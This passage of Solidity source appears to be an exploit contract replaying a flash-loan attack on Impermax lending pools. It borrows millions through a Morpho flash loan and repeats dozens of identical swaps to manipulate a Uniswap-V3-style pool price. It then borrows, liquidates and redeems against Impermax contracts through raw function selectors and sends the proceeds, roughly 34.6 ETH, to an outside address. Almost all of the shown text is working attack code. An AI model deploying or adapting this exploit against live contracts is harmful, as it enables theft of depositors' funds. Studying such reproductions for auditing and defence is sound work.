                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
    }

    function flashCallback16() internal {
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
    }

    function flashCallback17() internal {
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
    }

    function flashCallback18() internal {
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
    }

    function flashCallback19() internal {
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
    }

    function flashCallback20() internal {
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
    }

    function flashCallback21() internal {
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
    }

    function flashCallback22() internal {
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
    }

    function flashCallback23() internal {
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
    }

    function flashCallback24() internal {
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(100000),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        {
            (bool ok,) =
                Addresses.NFT_UNI_V3.call(abi.encodeWithSelector(bytes4(0x2f6d3457), 255, 1183215960000000000));
            require(ok, "call 0x2f6d3457 failed");
        }
        IImpermaxColl(Addresses.imxC).liquidationPenalty();
        {
            IERC20Like(Addresses.WETH).balanceOf(address(this));
            IERC20Like(Addresses.WETH).balanceOf(Addresses.imxB);
            IERC20Like(Addresses.WETH).balanceOf(Addresses.imxB);
        }
        {
            uint256 wethTransferAmount = 166988030575033714385;
            IERC20Like(Addresses.WETH).transfer(Addresses.imxB, wethTransferAmount);
        }
        {
            (bool ok,) = Addresses.imxB.call(abi.encodeWithSelector(bytes4(0x6a627842), address(this)));
            require(ok, "call 0x6a627842 failed");
        }
        IERC20Like(Addresses.WETH).balanceOf(Addresses.imxB);
        IERC20Like(Addresses.WETH).balanceOf(Addresses.imxB);
        {
            (bool ok,) = Addresses.imxB
                .call(
                    abi.encodeWithSelector(
                        bytes4(0x15f950fa), 255, address(this), 201595425653150513986, 128, Addresses.ZERO
                    )
                );
            require(ok, "call 0x15f950fa failed");
        }
        INftUniV3(Addresses.NFT_UNI_V3).reinvest(255, address(this));
        {
            (bool ok,) = Addresses.imxC.call(abi.encodeWithSelector(bytes4(0x70e18df6), 255));
            require(ok, "call 0x70e18df6 failed");
        }
        {
            (bool ok,) = Addresses.imxB.call(abi.encodeWithSelector(bytes4(0x380e2a8b), 255));
            require(ok, "call 0x380e2a8b failed");
        }
        {
            uint256 wethTransferAmount2 = 60090323578407036263;
            IERC20Like(Addresses.WETH).transfer(Addresses.imxB, wethTransferAmount2);
        }
        {
            (bool ok,) = Addresses.imxB
                .call(
                    abi.encodeWithSelector(
                        bytes4(0x15f950fa), 255, address(this), Addresses.ZERO, 128, Addresses.ZERO
                    )
                );
            require(ok, "call 0x15f950fa failed");
        }
        uint256 imxCRedeemAttackAttackContract =
            IImpermaxColl(Addresses.imxC).redeem(address(this), 255, 1000000000000000000);
        {
            INftUniV3(Addresses.NFT_UNI_V3).redeem(address(this), imxCRedeemAttackAttackContract);
        }
    }

    function flashCallback25() internal {
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(14260200223938238),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IERC20Like(Addresses.WETH).balanceOf(Addresses.imxB);
        IImpermaxBorrow(Addresses.imxB).exchangeRate();
        IERC20Like(Addresses.imxB).balanceOf(address(this));
        {
            uint256 swapRepayAmount = 120924566533707506470;
            IERC20Like(Addresses.imxB).transfer(Addresses.imxB, swapRepayAmount);
        }
        IImpermaxBorrow(Addresses.imxB).redeem(address(this));
        IERC20Like(Addresses.WETH).balanceOf(address(this));
        IERC20Like(Addresses.USDC).balanceOf(address(this));
        IExitPool(Addresses.A_D0B53D_F224)
            .swap(
                address(this),
                true,
                int256(-19760825),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IERC20Like(Addresses.WETH).balanceOf(address(this));
        IERC20Like(Addresses.USDC).balanceOf(address(this));
    }

    function flashCallback2() internal {
        _replayDone[REPLAY_BALANCE_OF_ATTACK_CONTRACT_2] = true;
        IERC20Like(Addresses.USDC).balanceOf(address(this));
        IERC20Like(Addresses.USDC).balanceOf(Addresses.A_BBBBBB_FFCB);
        uint256 flashLoanAllowance = 22539727986604;
        IERC20Like(Addresses.USDC).approve(Addresses.A_BBBBBB_FFCB, flashLoanAllowance);
        {
            bytes memory flashLoanUserData =
                hex"00000000000000000000000000000000000000000000000000000000000000200000000000000000000000004200000000000000000000000000000000000006000000000000000000000000833589fcd6edb6e08f4c7c32d4f71b54bda029130000000000000000000000005d93f216f17c225a8b5ffa34e74b7133436281ee000000000000000000000000bc303acda8b2a0dcd3d17f05adddf854edd6da59000000000000000000000000833589fcd6edb6e08f4c7c32d4f71b54bda02913000000000000000000000000c1d49fa32d150b31c4a5bf1cbf23cf7ac99eaf7d000000000000000000000000a68f6075ae62ebd514d1600cb5035fa0e2210ef80000000000000000000000006799246165c8ce1ed2e5cf8c494fa8e7a5de447200000000000000000000000000000000000000000000000000000000000000c800000000000000000000000000000000000000000000000000000000000001f4000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000017b7883c06916600000000000000000000000000000000000000000000000000000000012309ce540000000000000000000000000000000000000000000000000000000000000000064000000000000000000000000000000000000000000000000000000003b9aca00000000000000000000000000000000000000000000000000000000000000006400000000000000000000000000000000000000000000000000000000000186a00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000d0b53d9277642d899df5c87a3966a349a798f2240000000000000000000000000000000000000000000000000000000000000000";
            IMorphoFlashLoan(Addresses.A_BBBBBB_FFCB)
                .flashLoan(Addresses.USDC, 22539727986604, flashLoanUserData);
        }
    }

    function _payMintSwap() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_184016562672189] = true;
        IERC20Like(Addresses.WETH).transfer(Addresses.A_1C450D_F608, 184016562672189);
        IERC20Like(Addresses.USDC).transfer(Addresses.A_1C450D_F608, 20000000000000);
    }

    function borrowFlashLiquidity() internal {
        IPrimaryPool(Addresses.A_1C450D_F608).slot0();
        IExitPool(Addresses.A_D0B53D_F224).slot0();
        IExitPool(Addresses.A_D0B53D_F224).slot0();
        IERC20Like(Addresses.WETH).balanceOf(Addresses.A_BBBBBB_FFCB);
        IERC20Like(Addresses.USDC).balanceOf(Addresses.A_BBBBBB_FFCB);
        IERC20Like(Addresses.WETH).balanceOf(Addresses.A_BBBBBB_FFCB);
        IERC20Like(Addresses.USDC).balanceOf(Addresses.A_BBBBBB_FFCB);
        uint256 flashLoanAllowance = 10544813644832897955984;
        IERC20Like(Addresses.WETH).approve(Addresses.A_BBBBBB_FFCB, flashLoanAllowance);
        {
            bytes memory flashLoanUserData =
                hex"00000000000000000000000000000000000000000000000000000000000000200000000000000000000000004200000000000000000000000000000000000006000000000000000000000000833589fcd6edb6e08f4c7c32d4f71b54bda029130000000000000000000000005d93f216f17c225a8b5ffa34e74b7133436281ee000000000000000000000000bc303acda8b2a0dcd3d17f05adddf854edd6da59000000000000000000000000833589fcd6edb6e08f4c7c32d4f71b54bda02913000000000000000000000000c1d49fa32d150b31c4a5bf1cbf23cf7ac99eaf7d000000000000000000000000a68f6075ae62ebd514d1600cb5035fa0e2210ef80000000000000000000000006799246165c8ce1ed2e5cf8c494fa8e7a5de447200000000000000000000000000000000000000000000000000000000000000c800000000000000000000000000000000000000000000000000000000000001f4000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000017b7883c06916600000000000000000000000000000000000000000000000000000000012309ce540000000000000000000000000000000000000000000000000000000000000000064000000000000000000000000000000000000000000000000000000003b9aca00000000000000000000000000000000000000000000000000000000000000006400000000000000000000000000000000000000000000000000000000000186a00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000d0b53d9277642d899df5c87a3966a349a798f2240000000000000000000000000000000000000000000000000000000000000000";
            IMorphoFlashLoan(Addresses.A_BBBBBB_FFCB)
                .flashLoan(Addresses.WETH, 10544813644832897955984, flashLoanUserData);
        }
        IERC20Like(Addresses.USDC).balanceOf(address(this));
        IERC20Like(Addresses.WETH).balanceOf(address(this));
        uint256 attackerWethBalance = IERC20Like(Addresses.WETH).balanceOf(address(this));
        IWETHLike(Addresses.WETH).withdraw(attackerWethBalance);
        {
            uint256 nativeTransferAmount = address(this).balance;
            if (nativeTransferAmount > 34596457958884485813) nativeTransferAmount = 34596457958884485813;
            (bool ok,) = payable(Addresses.A_E9F853_24CD).call{value: nativeTransferAmount}("");
            if (!ok) {

            }
        }
        IERC20Like(Addresses.WETH).balanceOf(address(this));
        IERC20Like(Addresses.USDC).balanceOf(address(this));
    }

    function _paySwap1() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_1] = true;
        uint256 swapRepayAmount = 19403880776155;
        IERC20Like(Addresses.USDC).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap3() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_2] = true;
        uint256 swapRepayAmount = 19403880776155;
        IERC20Like(Addresses.USDC).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap4() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_3] = true;
        uint256 swapRepayAmount = 19403880776155;
        IERC20Like(Addresses.USDC).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap5() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950273675231740] = true;
        uint256 swapRepayAmount = 13495950273675231740;
        IERC20Like(Addresses.WETH).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap6() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_4] = true;
        uint256 swapRepayAmount = 19403880776155;
        IERC20Like(Addresses.USDC).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap7() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_5] = true;
        uint256 swapRepayAmount = 19403880776155;
        IERC20Like(Addresses.USDC).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap8() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950241446499285] = true;
        uint256 swapRepayAmount = 13495950241446499285;
        IERC20Like(Addresses.WETH).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap9() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_6] = true;
        uint256 swapRepayAmount = 19403880776155;
        IERC20Like(Addresses.USDC).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap10() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950289789598024] = true;
        uint256 swapRepayAmount = 13495950289789598024;
        IERC20Like(Addresses.WETH).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap11() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_7] = true;
        uint256 swapRepayAmount = 19403880776155;
        IERC20Like(Addresses.USDC).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap12() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_8] = true;
        uint256 swapRepayAmount = 19403880776155;
        IERC20Like(Addresses.USDC).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap13() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950200336960769] = true;
        uint256 swapRepayAmount = 13495950200336960769;
        IERC20Like(Addresses.WETH).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap14() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_9] = true;
        uint256 swapRepayAmount = 19403880776155;
        IERC20Like(Addresses.USDC).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap15() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950261141835769] = true;
